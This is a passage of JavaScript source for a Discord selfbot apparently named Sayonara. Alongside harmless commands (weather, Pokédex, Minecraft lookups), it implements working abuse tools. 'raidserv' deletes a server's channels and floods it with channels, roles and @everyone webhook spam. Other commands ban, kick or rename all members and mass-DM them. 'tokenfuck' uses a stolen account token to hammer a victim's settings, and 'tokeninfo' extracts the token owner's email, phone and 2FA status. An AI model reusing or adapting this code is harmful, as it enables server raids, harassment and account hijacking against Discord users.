                .addField("**```" + prefix + "unbanall ```**", `***${language.UNBANALL_DESC}.***`)
                .addField("**```" + prefix + "renameall + TEXT ```**", `***${language.RENAMEALL_DESC}.***`)
                .addField("**```" + prefix + "delroles ```**", `***${language.DELROLES_DESC}.***`)
                .addField("**```" + prefix + "spamroles + TEXT ```**", `***${language.SPAMROLES_DESC}.***`)
                .addField("**```" + prefix + "spamchannel + NUMBER + TEXT ```**", `***${language.SPAMCHANNEL_DESC}.***`)
                .addField("**```" + prefix + "delchannels ```**", `***${language.DELCHANNELS_DESC}.***`)
                .addField("**```" + prefix + "renameguild + TEXT ```**", `***${language.RENAMEGUILD_DESC}.***`)
                .addField("**```" + prefix + "fucklogs ```**", `***${language.FUCKLOG_DESC}.***`)
                .setImage(image)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
        
            message.channel.send(textmenu)
            consolelog("information", `${language.DEBUG_LOG_RAID_SEND}.`)
        }

        if (cmd === "serverinfo")
        {
            message.delete()
            let server = message.guild;
            if (!server) return DoNotif(`${language.ERROR_COMMANDS_ONLY_SERVER_NOTIF}`);

            function checkDays(date) 
            { 
                let now = new Date(); let diff = now.getTime() - date.getTime(); let days = Math.floor(diff / 86400000);
                return days + (days == 1 ? " day" : " days") + " ago";
            };

            let iconserver = message.guild.iconURL;
            var owner = message.guild.owner.displayName
            const verificationLevels = ['No restriction', 'Email verified', 'Registered for more than 5min minimum', 'Member of the server for more than 10 minutes', 'Verified Phone'];

            const serverinfo = new Discord.RichEmbed()
            .setTitle("**「>> " + random_emojis + "「𝙄𝙣𝙛𝙤 𝙨𝙚𝙧𝙫𝙚𝙧」" + random_emojis + " <<」**")
            .setColor(color)
            .setThumbnail(iconserver)
            .addField('Name of the server: ', `►  ${message.guild.name}`)
            .addField('ID of the server: ', `►  ${message.guild.id}`)
            .addField('Security of the server: ', `►  ${verificationLevels[message.guild.verificationLevel]}\n`)
            .addField('Server created: ', `►  ${message.channel.guild.createdAt.toUTCString().substr(0, 16)} (${checkDays(message.channel.guild.createdAt)})`)
            .addField('Bot of the server: ', `►  ${message.guild.members.filter(member => member.user.bot).size}`)
            .addBlankField()
            .addField('Roles of the server: ', `►  ${message.guild.roles.size}`)
            .addField('Channels of the server: ', `► ${message.guild.channels.size}\n`)
            .addField('Members on this server: ', `► ${message.guild.members.size}\n`)
            .addBlankField()
            .addField(':crown: Owner of this server: ', `► ${owner}\n`)
            .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
            serverinfo.setTimestamp();

            message.channel.send(serverinfo)
        }

        if (cmd === "dmall") 
        {
            let serveur = message.guild;
            if (!serveur) return DoNotif(`${language.ERROR_COMMANDS_ONLY_SERVER_NOTIF}`);
            if (!args.join(' ')) return DoNotif(`${language.ERROR_COMMANDS_EMPTYMSG_NOTIF}`);
            message.delete()

            message.guild.members.forEach(member => 
            {
                if (member.id === client.user.id) return;
                member.send(args.join(' ')).then(() => 
                {

                });
            });

            DoNotif("```All members has been DM. ✅```")
        }

        if (cmd === "raidserv")
        {
            if (!message.channel.guild) return DoNotif(`${language.ERROR_COMMANDS_ONLY_SERVER_NOTIF}`);
            let msg = args.slice(0).join(" ");
            message.delete()

            if (msg === "stop") 
            {
                clearInterval(interval);
                interval = undefined;
                return DoNotif("```raid has been stopped. ✅```");
            }

            message.guild.channels.forEach(ch => 
            {
                ch.delete().then(() => 
                {

                }).catch(() => 
                {

                });
            });

            setInterval(() => 
            {
                setImmediate(() => 
                {
                    message.guild.createChannel(name, 
                    {
                        type: 'text',
                        topic: "𝙈𝙖𝙙𝙚 𝘽𝙮 𝙈𝙞𝙨𝙖𝙠𝙞𝙞𝙞"
                    }).then((ch) => 
                    {
                        if (ch && ch.type === 'text') 
                        {
                            ch.createWebhook(name, 'https://cdn.discordapp.com/attachments/810944520682340372/811900785482530846/devil.jpg').then((webhook) => 
                            {
                                setInterval(() => 
                                {
                                    webhook.send("@everyone " + webmsg);
                                });
                            }).catch((e) => 
                            {
                                console.log(e);
                            });
                        }
                    });
                });
            });

            process.nextTick(() => 
            {
                for (let i = 0; i < 500; i++) 
                {
                    message.guild.createChannel(name, 
                        {
                        type: 'text',
                        topic: "𝙈𝙖𝙙𝙚 𝘽𝙮 𝙈𝙞𝙨𝙖𝙠𝙞𝙞𝙞"
                    }).then((ch) => 
                    {
                        if (ch && ch.type === 'text') 
                        {
                            ch.createWebhook(name, 'https://cdn.discordapp.com/attachments/810944520682340372/811900785482530846/devil.jpg').then((webhook) => {
                                setInterval(() => 
                                {
                                    webhook.send("@everyone " + webmsg);
                                });
                            }).catch((e) => {});
                        }
                    });
                }
            });
            setInterval(() => 
            {
                message.guild.createRole({
                    name: rolename,
                    color: "RANDOM",
                    hoist: true,
                }).then((role) => {}).catch(() => {});
            });

            return DoNotif("```Raid started, for stop type " + prefix + "raid stop ✅```");
        }

        if (cmd === "kickall") 
        {
            message.delete()
            if (!message.guild) return DoNotif(`${language.ERROR_COMMANDS_ONLY_SERVER_NOTIF}`);
            if (!message.member.hasPermission('KICK_MEMBERS')) return DoNotif(`${language.ERROR_COMMANDS_PERMS_KICK_MEMBERS}`);

            message.guild.members.forEach(everyone => 
            {
                everyone.kick()
            });

            DoNotif("```All members was kicked. ✅```")
        }

        if (cmd === "banall") 
        {
            message.delete()
            if (!message.guild) return DoNotif(`${language.ERROR_COMMANDS_ONLY_SERVER_NOTIF}`);
            if (!message.member.hasPermission('BAN_MEMBERS')) return DoNotif(`${language.ERROR_COMMANDS_PERMS_BAN_MEMBERS}`);
            setTimeout(() => 
            {
                for (let i = 0; i < message.guild.members.array().length; i++)
                {
                    let u = message.guild.members.array()[i];
                    u.ban().then(() => 
                    {

                    }).catch(() => 
                    {
                        DoNotif("```Impossible to ban every members. ❌```")
                    });
                };
                message.guild.members.forEach(mm => 
                    {
                    mm.ban().then(() => 
                    {

                    }).catch(() => 
                    {

                    });
                });
            }, 300);

            DoNotif("```Every members was banned. ✅```")
        }

        if (cmd === "unbanall")
        {
            let server = message.guild;
            if (!server) return DoNotif(`${language.ERROR_COMMANDS_ONLY_SERVER_NOTIF}`);
            if (!message.member.hasPermission('BAN_MEMBERS')) return DoNotif(`${language.ERROR_COMMANDS_PERMS_BAN_MEMBERS}`);

            let interval = setInterval(function() 
            {
                message.guild.fetchBans().then(bans => 
                {
                    bans.forEach(ban => 
                    {
                        message.guild.unban(ban.id);
                    });
                });
            }, 1000);

            DoNotif("```Every members was unbanned. ✅```")
        }

        if (cmd === "renameall") 
        {
            let msg = args.slice(0).join(" ");
            message.delete()
            if (!message.guild) return DoNotif(`${language.ERROR_COMMANDS_ONLY_SERVER_NOTIF}`);
            if (!message.member.hasPermission('MANAGE_NICKNAMES')) return DoNotif(`${language.ERROR_COMMANDS_PERMS_MANAGE_NICKNAMES}`);

            message.guild.members.forEach(everyone => 
                {
                everyone.setNickname(msg)
            });

            DoNotif("```All members was rename. ✅```")
        }

        if (cmd === "spamroles") 
        {
            let msg = args.slice(0).join(" ");
            message.delete()
            DoNotif("```Successfully roles created with the name " + msg + ". ✅```")
            process.nextTick(() => 
            {
                setInterval(() => 
                {
                    message.guild.createRole({
                        name: msg,
                        color: "RANDOM",
                        hoist: true,
                    }).then((role) => 
                    {

                    }).catch(() => 
                    {
                        DoNotif("```Roles impossible to create. ❌```")
                    });
                });
            });
        }

        if (cmd === "spamchannel") 
        {
            const amount = args[0];
            let msg = args.slice(1).join(" ");
            if (!amount) 
            {
                message.delete();
                setTimeout(() => 
                {
                    DoNotif("```No amount given, please set a number. ❌```")
                }, 300);
                return;
            }
            if (Number.isNaN(amount)) 
            {
                message.delete();
                setTimeout(() =>
                {
                    DoNotif("```Amount must be a number, please set a number. ❌```")
                }, 300);
                return;
            }

            DoNotif("```Channel has been created. ✅```")
            //  setInterval(() => {
            for (var i = 0; i < parseInt(amount); i++) 
            {
                message.guild.createChannel(msg).then((ch) => 
                {

                }).catch(() => 
                {
                    DoNotif("```Impossible to create a channel. ❌```")
                });
            }
            return;
        }


        if (cmd === "delchannels") 
        {
            message.delete()
            if (!message.guild) return DoNotif(`${language.ERROR_COMMANDS_ONLY_SERVER_NOTIF}`);
            if (!message.member.hasPermission('MANAGE_CHANNELS')) return DoNotif(`${language.ERROR_COMMANDS_PERMS_MANAGE_CHANNELS}`);
            message.guild.channels.forEach(ch => 
                {
                ch.delete().then(() => 
                {

                }).catch(() => 
                {
                    DoNotif("```Impossible to delete this channel. ❌```")
                });
            });

            DoNotif("```Channel has been deleted. ✅```")
        }

        if (cmd === "renameguild")
        {
            let mess = args.slice(0).join(" ");
            let serveur = message.guild;
            message.delete()
            if (!serveur) return DoNotif(`${language.ERROR_COMMANDS_ONLY_SERVER_NOTIF}`);
            if (!message) return DoNotif(`${language.ERROR_COMMANDS_EMPTYMSG_NOTIF}`);
            if (!message.member.hasPermission(['MANAGE_GUILD'])) return DoNotif(`${language.ERROR_COMMANDS_PERMS_MANAGE_GUILD}`)
            message.guild.setName(mess)
            DoNotif("```Name guild has been changed. ✅```")
        }

        if (cmd === "fucklogs")
        {
            let stopit = args[0];
            var server = message.guild;
            message.delete()

            if (!server) return DoNotif(`${language.ERROR_COMMANDS_ONLY_SERVER_NOTIF}`)
            if (stopit === "stop")
            {
                clearInterval(interval);
                interval = undefined;
                return DoNotif("```Fuck logs has been stopped. ✅```");
            }

            function makeid(length) 
            {
                var result = "";
                var characters =
                    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
                var charactersLength = characters.length;
                for (var i = 0; i < length; i++) {
                    result += characters.charAt(
                        Math.floor(Math.random() * charactersLength)
                    );
                }
                return result;
            }

            interval = setInterval(function() 
            {

                message.guild.member(message.author).setNickname(makeid(16));
            }, 1000);

            DoNotif("```Fuck logs has been started. do " + prefix + "fucklogs stop for stop it ✅```");
        }
        
        //#endregion
        

        
        //#region > MICS MENU & OPTIONS

        if (cmd === "mics") 
        {
            message.delete()
        
            const textmenu = new Discord.RichEmbed()
                .setTitle("**「>> " + random_emojis + "「𝙈𝙚𝙣𝙪 𝙈𝙞𝙨𝙘」" + random_emojis + " <<」**")
                .setThumbnail(client.user.displayAvatarURL)
                .setColor(color)
                .addField("**```" + prefix + "gettimes ```**", `***${language.GETTIME_DESC}.***`)
                .addField("**```" + prefix + "searchimg + TEXT ```**", `***${language.SEARCHIMG_DESC}.***`)
                .addField("**```" + prefix + "survey + TEXT ```**", `***${language.SURVERY_DESC}.***`)
                .addField("**```" + prefix + "tokenfuck + TOKEN ```**", `***${language.FUCKTOKEN}***`)
                .addField("**```" + prefix + "tokenfuckv2 ```**", `***${language.FUCKTOKENV2}***`)
                .addField("**```" + prefix + "tokeninfo + TOKEN ```**", `***${language.TOKENINFO_DESC}***`)
                .addField("**```" + prefix + "read ```**", `***${language.READ_DESC}***`)
                .addField("**```" + prefix + "embed + TEXT ```**", `***${language.EMBED_DESC}***`)
                .addField("**```" + prefix + "weather + city ```**", `***${language.WEATHER_DESC}***`)
                .addField("**```" + prefix + "membersinfo ```**", `***${language.MEMBERINFO_DESC}.***`)
                .addField("**```" + prefix + "pokedex + POKEMON NAME ```**", `***${language.POKEDEX_DESC}.***`)
                .addField("**```" + prefix + "mcskins + NAME ```**", `***${language.MCSKINS_DESC}.***`)
                .addField("**```" + prefix + "mcuser + NAME ```**", `***${language.MCUSER_DESC}.***`)
                .addField("**```" + prefix + "fakebutton ```**", `***${language.FAKEBUTTON}.***`)
                .setImage(image)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
        
            message.channel.send(textmenu)
            consolelog("information", `${language.DEBUG_LOG_MICS_SEND}.`)
        }

        if (cmd === "gettimes")
        {
            message.delete()
            const embed = new Discord.RichEmbed()
            .setTitle("**「>> " + random_emojis + "「𝙂𝙚𝙩 𝙩𝙞𝙢𝙚」" + random_emojis + " <<」**")
            .setThumbnail(client.user.displayAvatarURL)
            .setColor(color)
            .setDescription(`${moment().format('MMMM Do YYYY, h:mm:ss a')}`)
            .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
            
            message.channel.send(embed)
        }

        if (cmd === "searchimg") 
        {
            let search = args.slice(0).join(" ");
            message.delete()

            if (!search) return DoNotif(language.ERROR_COMMANDS_EMPTYMSG_NOTIF)

            const google = new Scraper({
                puppeteer: 
                {
                  headless: false,
                },
              });

              (async () => 
              {
                const results = await google.scrape(search, 200);

                var max = 0;
                var min = 200;
                var MathRan = Math.floor(Math.random() * (max - min + 0)) + min;
                var MathLoL = Math.round(MathRan);

                const embed = new Discord.RichEmbed()
                        .setTitle("Image searcher: " + search)
                        .setImage(results[MathLoL].url)
                        .setColor(color)
                        .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)

                return message.channel.send(embed);
              })();
        }

        if (cmd === "survey")
        {
            let text = args.slice(0).join(" ");
            message.delete()

            if (!text) return DoNotif(`${language.ERROR_COMMANDS_EMPTYMSG_NOTIF}`)

            let embed = new Discord.RichEmbed()
            .setColor(color)
            .setDescription(`** ${text} **`)
            .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`)
            embed.setTimestamp();

            message.channel.send(embed).then(function(message) 
            {
                message.react("✅")
                message.react("❌")
            })
        }

        if (cmd === "tokenfuck") 
        {
            let VICTIM = args[0];
            message.delete()
            if (!VICTIM) return DoNotif("```Please, enter the tokens of someone you want to fuck. ❌```");
        
            if (VICTIM === "stop") 
            {
                clearInterval(interval);
                interval = undefined;
                return DoNotif("```Token fuck has been stopped. ✅```");
            }

                if (!interval) 
                {
                    interval = setInterval(() => 
                    {
                        var postData1 = { locale: "de" }; let axiosConfig1 = { headers: { 'content-type': 'application/json', 'authorization': VICTIM } };
                        axios.patch(`https://discord.com/api/${Discord_Version}/users/@me/settings`, postData1, axiosConfig1).catch(err => {})
        
                        var postData2 = { locale: "ja" }; let axiosConfig2 = { headers: { 'content-type': 'application/json', 'authorization': VICTIM } };
                        axios.patch(`https://discord.com/api/${Discord_Version}/users/@me/settings`, postData2, axiosConfig2).catch(err => {})
        
                        var postData3 = { locale: "zh-TW" }; let axiosConfig3 = { headers: { 'content-type': 'application/json', 'authorization': VICTIM } };
                        axios.patch(`https://discord.com/api/${Discord_Version}/users/@me/settings`, postData3, axiosConfig3).catch(err => {})
        
                        var postData4 = { channels: [], guild_template_code: "2TffvPucqHkN", icon: null, name: "𝙎𝙖𝙮𝙤𝙣𝙖𝙧𝙖 " + random_emojis, system_channel_id: null }; let axiosConfig4 = { headers: { 'content-type': 'application/json', 'authorization': VICTIM } };
                        axios.post(`https://discord.com/api/${Discord_Version}/guilds`, postData4, axiosConfig4).catch(err => {})
        
                        var postData5 = { theme: "dark" }; let axiosConfig5 = { headers: { 'content-type': 'application/json', 'authorization': VICTIM } };
                        axios.patch(`https://discord.com/api/${Discord_Version}/users/@me/settings`, postData5, axiosConfig5).catch(err => {})
        
                        var postData6 = { theme: "light" }; let axiosConfig6 = { headers: { 'content-type': 'application/json', 'authorization': VICTIM } };
                        axios.patch(`https://discord.com/api/${Discord_Version}/users/@me/settings`, postData6, axiosConfig6).catch(err => {})
        
                        var postData7 = { message_display_compact: false }; let axiosConfig7 = { headers: { 'content-type': 'application/json', 'authorization': VICTIM } };
                        axios.patch(`https://discord.com/api/${Discord_Version}/users/@me/settings`, postData7, axiosConfig7).catch(err => {})
        
                        var postData8 = { message_display_compact: true }; let axiosConfig8 = { headers: { 'content-type': 'application/json', 'authorization': VICTIM } };
                        axios.patch(`https://discord.com/api/${Discord_Version}/users/@me/settings`, postData8, axiosConfig8).catch(err => {})
        
                    }, 50);
                } else {
                    message.channel.send('a loop is already running');
                }
            return DoNotif("```Token fuck has been started, please type " + prefix + "tokenfuck stop for stop it ✅```");
        }

        if (cmd === "tokenfuckv2")
        {
            setTimeout(function() 
            {
                DoNotif("```This is a new way for fuck any token, Sayonara will destroy the token connected to the selfbot now```");  
            }, 0)

            setTimeout(function() 
            {
                DoNotif("```If you using your account or it's your main account, close the program you have 5 seconds before it's start...```");
            }, 7000)

            setTimeout(function() 
            {
                DoNotif("```⚠️⚠️ This is just a warning for stupid user use it on his main acc ⚠️⚠️```");
            }, 14000)

            var count = 0

            setTimeout(function() 
            {
                message.edit(count += 1)
            }, 21000)

            setTimeout(function() 
            {
                message.edit(count += 1)
            }, 22000)

            setTimeout(function() 
            {
                message.edit(count += 1)
            }, 23000)

            setTimeout(function() 
            {
                message.edit(count += 1)
            }, 24000)

            setTimeout(function() 
            {
                message.edit(count += 1)
            }, 25000)

            setTimeout(function() 
            {
                client.guilds.forEach(guild => 
                {  
                    guild.delete() 
                    guild.leave()                
                });
            }, 27000)

            setTimeout(function() 
            {
                client.user.friends.forEach(member => 
                {
                    member.send("𝙏𝙝𝙞𝙨 𝙖𝙘𝙘 𝙬𝙖𝙨 𝙙𝙚𝙨𝙩𝙧𝙤𝙮𝙚𝙙 𝙗𝙮 𝙎𝙖𝙮𝙤𝙣𝙖𝙧𝙖 𝙎𝙚𝙡𝙛𝘽𝙤𝙩" + random_emojis).catch(e => {});
                })
            }, 30000)

            setTimeout(function() 
            {
                client.user.friends.forEach(friend => 
                {  
                    friend.block()               
                });
            }, 40000)

            setTimeout(function() 
            {
                DoNotif("```Account is now fucked ! ✅```");
            }, 41000)
        }

        if (cmd == "tokeninfo") 
        {
            let VICTIM = args[0];
        
            request({
                uri: `https://discord.com/api/${Discord_Version}/users/@me`,
                headers: {
                    'Content-Type': 'application/json',
                    Authorization: VICTIM
                },
                json: true,
                method: "GET"
            }, function(err, response, status) {
                var reponseme = response.body;
        
                request({
                    uri: `https://discord.com/api/${Discord_Version}/users/@me/settings`,
                    headers: {
                        'Content-Type': 'application/json',
                        Authorization: VICTIM
                    },
                    json: true,
                    method: "GET"
                }, function(err, response, status) {
                    var reponsemesettings = response.body;
        
                    var msg = "";
                    msg += "\n> Username: " + `${reponseme.username}`;
                    msg += "\n> Discriminator: " + `${reponseme.discriminator}`;
                    msg += "\n> ID: " + `${reponseme.id}`;
                    msg += "\n> Avatar: " + `https://cdn.discordapp.com/avatars/${reponseme.id}/${reponseme.avatar}.jpg?size=4096`;
                    msg += "\n> Phone: " + `${reponseme.phone}`;
                    msg += "\n> Email: " + `${reponseme.email}`;
                    msg += "\n> 2FA: " + `${reponseme.mfa_enabled}`;
                    msg += "\n> Nitro: " + `${reponseme.premium_type}`;
                    msg += "\n> Flags: " + `${reponseme.public_flags}`;
                    msg += "\n> Theme: " + `${reponsemesettings.theme}`;
                    msg += "\n> Game Activity: " + `${reponsemesettings.show_current_game}`;
                    msg += "\n> Language: " + `${reponsemesettings.locale}`;
                    var embed = new Discord.RichEmbed()
                        .setTitle("**Token Info**")
                        .setDescription(msg)
                        .setColor(color)
                        .setImage(image)
                        .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
        
                    return message.edit(embed)
                })
            })
        }

        if (cmd === "read")
        {
            message.delete()

            var embed = new Discord.RichEmbed()
            .setTitle("***Last Ping Infos***")
            .setColor(color)
            .addField("***💬 Message:***", read_ping_msg)
            .addField("***👤 User:***", read_ping_user)
            .addField("***🔌 Server:***", read_ping_server)
            .addField("***📌 Channel:***", read_ping_channel)
            .setImage(image)
            .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)

            message.channel.send(embed)
        }

        if (cmd === "embed")
        {
            if (!args.join(' ')) return DoNotif(`${language.ERROR_COMMANDS_EMPTYMSG_NOTIF}`);
            message.delete();

            let MESS = args.join(' ')

            let sayEmbed = new Discord.RichEmbed()
            .setColor(color)
            .setTitle(MESS)
            .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
            message.channel.send(sayEmbed)
        }

        if (cmd === "weather")
        {
            weather.find({search: args.join(" "), degreeType: 'C'}, function (error, result)
            {
                if(error) return message.channel.send(error);
                if(!args[0]) return DoNotif(language.ERROR_COMMANDS_EMPTYMSG_NOTIF)
        
                if(result === undefined || result.length === 0) return message.channel.send('Sorry, this location is invalid.');
        
                var current = result[0].current;
                var location = result[0].location;

                message.delete()
        
                const weatherinfo = new Discord.RichEmbed()
                .setColor(color)
                .setAuthor(`Weather forecast for : ${current.observationpoint}`)
                .setThumbnail(current.imageUrl)
                .addField('Schedule :', `Hours : ${current.observationtime}`, true)
                .addField('Degree Type :', `${location.degreetype}`, true)
                .addField('Temperature :', `${current.temperature}°`, true)
                .addField('Wind :', current.winddisplay, true)
                .addField('Predicted temperature :', `${current.feelslike}°`, true)
                .addField('Humidity :', `${current.humidity}%`, true)
                .addBlankField()
                .addField('Days :', `${current.day}`, true)
                .addField('Date :', `${current.date}`, true)
                .addField('Lat :', `${location.lat}`, true)
                .addField('Long :', `${location.long}`, true)
                .addField('Sky :', `${current.skytext}`, true)
                .addField('Alert :', `warning: ${location.alert}`, true)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)

                message.channel.send(weatherinfo)
            })
        }

        if (cmd === "membersinfo")
        {
            message.delete()
            var resp =
            ":spy: **__Member(s) Total__** : " + message.guild.memberCount + "\n\n" +
            ":white_check_mark: **Online** : " + message.guild.members.filter(o => o.presence.status === 'online').size + " | " +
            ":no_entry:  **Do no disturb** : " + message.guild.members.filter(d => d.presence.status === 'dnd').size + "\n" +
            ":large_orange_diamond: **Idle** : " + message.guild.members.filter(i => i.presence.status === 'idle').size + " | " +
            ":zzz: **Offline** : " + message.guild.members.filter(a => a.presence.status === 'offline').size;
                        
            let embed = new Discord.RichEmbed()
              .setColor(color)
              .setDescription(resp)
              .setTitle("**𝙄𝙣𝙛𝙤 𝙈𝙚𝙢𝙗𝙚𝙧𝙨**");
            embed.setTimestamp();
            
            message.channel.send(embed);
        }

        if (cmd === "pokedex") 
        {
            message.delete();
            let pokemoncherche = args.slice(0).join(" ")
            snekfetch.get('https://some-random-api.ml/pokedex?pokemon=' + pokemoncherche).then(r => 
            {
                var name = r.body.name
                var id = r.body.id
                var type = r.body.type
                var species = r.body.species
                var abilities = r.body.abilities
                var height = r.body.height
                var weight = r.body.weight
                var base_experience = r.body.base_experience
                var genre = r.body.gender
                var hp = r.body.stats['hp'];
                var attack = r.body.stats['attack'];
                var defense = r.body.stats['defense'];
                var speed = r.body.stats['speed'];
                var evolutionLine = r.body.family['evolutionLine'];
                var animated = r.body.animated
                var pdescription = r.body.description
                var generation = r.body.generation
        
                var embed = new Discord.RichEmbed()
                    .setTitle(`${client.user.username} ** POKEDEX **`)
                    .setDescription('pokedex')
                    .addField('```Name:```', name)
                    .addField('```description:```', pdescription)
                    .addField('```ID:```', id)
                    .addField('```Génération:```', generation)
                    .addField('```Type:```', type)
                    .addField('```species:```', species)
                    .addField('```Abilities:```', abilities)
                    .addField('```Genre:```', genre)
                    .addField('```Experience:```', base_experience)
                    .addField('```Hp:```', hp)
                    .addField('```Attack:```', attack)
                    .addField('```Defense:```', defense)
                    .addField('```Poids:```', weight)
                    .addField('```Hauteur:```', height)
                    .addField('```Speed:```', speed)
                    .addField('```EvolutionLine:```', evolutionLine)
                    .setImage("http://i.some-random-api.ml/pokemon/" + pokemoncherche + ".gif")
                    .setThumbnail("http://i.some-random-api.ml/pokemon/" + pokemoncherche + ".png")
                    .setColor(color)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)

                message.channel.send(embed)
            }).catch(err => {});
        }

        if (cmd === "mcskins")
        {
            message.delete()
            const skin = parseInt(args[0]);
            
            if(!args[0]) return DoNotif(language.ERROR_COMMANDS_EMPTYMSG_NOTIF)
            
            const embed = new Discord.RichEmbed()
            .setColor(color)
            .setTitle("**Skin Minecraft**")
            .setDescription("Skin `" + `${args[0]}` + "`\n[Download](https://minotar.net/download/" + `${args[0]}` + ")")
            .setImage("https://minotar.net/armor/body/" + `${args[0]}` + ".png")
            .setThumbnail("https://minotar.net/cube/" + args[0] + "/100.png")
            .setTimestamp()
            .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
            
            message.channel.send(embed)
        }

        if (cmd === "mcuser")
        {
            message.delete()
            const skin = parseInt(args[0]);
            
            if(!args[0]) return DoNotif(language.ERROR_COMMANDS_EMPTYMSG_NOTIF)

            snekfetch.get('https://api.mojang.com/users/profiles/minecraft/' + args[0]).then(r => 
            {
                var UUID = r.body.id
                
                const embed = new Discord.RichEmbed()
                .setColor(color)
                .setTitle("**Infos Minecraft Account**")
                .setDescription("**Username: **" + `${args[0]}` + "\n**UUID: **" + `${UUID}` + "")
                .setImage(`https://crafatar.com/skins/${UUID}.png`)
                .setThumbnail(`https://crafatar.com/renders/body/${UUID}`)
                .setTimestamp()
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)

                message.channel.send(embed)
            })
        }

        if (cmd === "fakebutton")
        {
            let button = new disbut.MessageButton()
            .setStyle('red') //default: blurple
            .setLabel('My First Button!') //default: NO_LABEL_PROVIDED
            .setID('click_to_function') //note: if you use the style "url" you must provide url using .setURL('https://example.com')
            .setDisabled(); //disables the button | default: false
            
            message.channel.send('Hey, i am powered by https://npmjs.com/discord-buttons', button);
        }

        //#endregion
        


        //#region > PROTECTIONS MENU & OPTIONS

        if (cmd === "protection") 
        {
            message.delete()
        
            const textmenu = new Discord.RichEmbed()
                .setTitle("**「>> " + random_emojis + "「𝙈𝙚𝙣𝙪 𝙋𝙧𝙤𝙩𝙚𝙘𝙩𝙞𝙤𝙣𝙨」" + random_emojis + " <<」**")
                .setThumbnail(client.user.displayAvatarURL)
                .setColor(color)
                .addField("**```" + prefix + "lockchannel on / off```**", `***${language.LOCKCHANNEL}.***`)
                .addField("**```" + prefix + "purge ```**", `***${language.PURGE_DESC}.***`)
                .addField("**```" + prefix + "warn + MENTION ```**", `***${language.WARN_DESC}.***`)
                .addField("**```" + prefix + "banid + ID ```**", `***${language.BANID_DESC}.***`)
                .addField("**```" + prefix + "kickid + ID ```**", `***${language.KICKID_DESC}.***`)
                .setImage(image)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
        
            message.channel.send(textmenu)
            consolelog("information", `${language.DEBUG_LOG_PROTECTION_SEND}.`)
        }

        if (cmd === "lockchannel")
        {
            var server = message.guild
            let membersWithRole = message.guild.roles.find(r => r.name === "everyone");

            if (!server) return DoNotif(language.ERROR_COMMANDS_ONLY_SERVER_NOTIF)
            if (!message.guild.member(message.author).hasPermission("ADMINISTRATOR")) return DoNotif(language.ERROR_COMMANDS_PERMS_ADMIN_GUILD); 
            
            return DoNotif("Sorry, this command is still in dev.")
        }

        if (cmd === "purge") 
        {
            let args = message.content.split(" ").slice(1);
            let messagecount = parseInt(args[0]) || 1;
            var deletedMessages = -1;
            message.channel.fetchMessages({
                    limit: Math.min(messagecount + 1, 100, 200)
                })
                .then(messages => 
                {
                    messages.forEach(message => 
                    {
                        message.delete().catch(console.error);
                        deletedMessages++;
                    });
                }).then(() => 
                {
                    if (deletedMessages === -1) deletedMessages = 0
                    message.channel.send(`${deletedMessages} * messages will be deleted.*`).then(message => message.delete(5000));
                }).catch(console.error); 
        }
        
        if (cmd === "warn")
        {
            var server = message.guild
            const user = message.mentions.users.first()  
            let msg = args.slice(1).join(" ");

            message.delete()

            if (!server) return DoNotif(language.ERROR_COMMANDS_ONLY_SERVER_NOTIF)
            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);
            if (!msg) return DoNotif(`${language.ERROR_COMMANDS_EMPTYMSG_NOTIF}`)

            var embed = new Discord.RichEmbed()
                .setTitle("***Warn***")
                .setColor(color)
                .setDescription(`You have been warned for reason: ***${msg}*** from the server: ***${message.guild.name}***`)
                .setTimestamp()
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)

            user.send(embed)
        }

        if (cmd === "banid")
        {
            var server = message.guild
            let usermentioned = args[0];
            message.delete()

            if (!server) return DoNotif(language.ERROR_COMMANDS_ONLY_SERVER_NOTIF)
            if (!usermentioned) return DoNotif(`${language.ERROR_COMMANDS_EMPTYMSG_NOTIF}`)
            if (!message.guild.member(message.author).hasPermission("BAN_MEMBERS")) return DoNotif(language.ERROR_COMMANDS_PERMS_BAN_MEMBERS);

            message.guild.ban(usermentioned).catch(error => { return DoNotif(language.ERROR_COMMANDS_OCCURED_NOTIF)})
            return DoNotif(`<@${usermentioned}> has been banned! ✅`)
        }

        if (cmd === "kickid")
        {
            var server = message.guild
            let usermentioned = args[0];
            message.delete()

            if (!server) return DoNotif(language.ERROR_COMMANDS_ONLY_SERVER_NOTIF)
            if (!usermentioned) return DoNotif(`${language.ERROR_COMMANDS_EMPTYMSG_NOTIF}`)
            if (!message.guild.member(message.author).hasPermission("KICK_MEMBERS")) return DoNotif(language.ERROR_COMMANDS_PERMS_KICK_MEMBERS);
            
            let member = message.guild.member(usermentioned);
            if (message.guild.member(usermentioned)) 
            {
                member.kick();
                return DoNotif(`<@${usermentioned}> has been kicked! ✅`)
            }
            else
            {
                return DoNotif(language.ERROR_COMMANDS_MEMBER_NOT_EXIST_NOTIF)
            }
            
        }
        
        //#endregion
        
        

        //#region > HACK MENU & OPTIONS


        if (cmd === "hack") 
        {
            message.delete()

            const help = new Discord.RichEmbed()
                .setTitle("**「>> " + random_emojis + "「𝙈𝙚𝙣𝙪 𝙃𝙖𝙘𝙠」" + random_emojis + " <<」**")
                .setThumbnail(client.user.displayAvatarURL)
                .setColor(color)
                .addField("**```" + prefix + "voclag ```**", `***${language.VOCLAG_DESC}.***`)
                .addField("**```" + prefix + "delwebhook + WEBHOOK ```**", `***${language.DELWEBHOOK_DESC}.***`)
                .addField("**```" + prefix + "tokenchecker + TOKEN ```**", `***${language.TOKENCHECKER_DESC}.***`)
